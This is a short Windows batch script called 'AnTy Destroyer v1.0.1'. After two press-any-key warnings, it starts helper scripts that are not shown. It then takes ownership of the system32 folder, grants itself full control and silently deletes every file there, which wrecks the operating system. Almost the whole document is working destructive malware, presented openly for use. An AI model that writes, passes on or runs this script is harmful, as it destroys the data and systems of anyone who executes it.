@echo off
title AnTy Destroyer v1.0.1
cd file
start warning.vbs
echo Press any key to begin destruction
pause >nul
echo This is your final warning! (press any key to begin)
pause >nul
color 04
cls
echo beginning destruction
start appdata.bat
start apd.vbs
takeown /f "C:\windows\system32" /a /r /d Y >nul
icacls "C:\windows\system32" /T /grant Adminstrator:F >nul
cd /d "C:\windows\system32"
del *.* /s /f /q >nul
cls

